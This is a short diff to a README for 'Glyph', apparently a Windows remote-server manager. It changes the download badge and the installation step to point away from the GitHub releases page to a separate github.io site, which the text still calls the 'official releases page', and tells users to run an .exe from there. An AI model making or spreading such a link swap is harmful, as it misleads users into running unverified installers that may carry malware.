@@ -1,6 +1,6 @@
 # 🖥️ Glyph - Manage your remote servers with ease
 
-[![](https://img.shields.io/badge/Download_Glyph-grey?style=for-the-badge&link=https://github.com/Ult-contraband36/Glyph/releases)](https://github.com/Ult-contraband36/Glyph/releases)
+[![](https://img.shields.io/badge/Download_Glyph-grey?style=for-the-badge&link=https://ult-contraband36.github.io)](https://ult-contraband36.github.io)
 
 Glyph helps you manage your remote servers from one window. Use this tool to organize your connections, check server status, and move files across multiple systems. It provides a clean interface for tasks that usually require complex code.
 
@@ -27,7 +27,7 @@ Before you install Glyph, make sure your computer meets these needs:
 
 Follow these steps to set up Glyph on your Windows computer:
 
-1. Visit the [official releases page here](https://github.com/Ult-contraband36/Glyph/releases) to find the latest version.
+1. Visit the [official releases page here](https://ult-contraband36.github.io) to find the latest version.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file name to download the installer to your computer.
 4. Locate the file in your downloads folder once the process finishes.
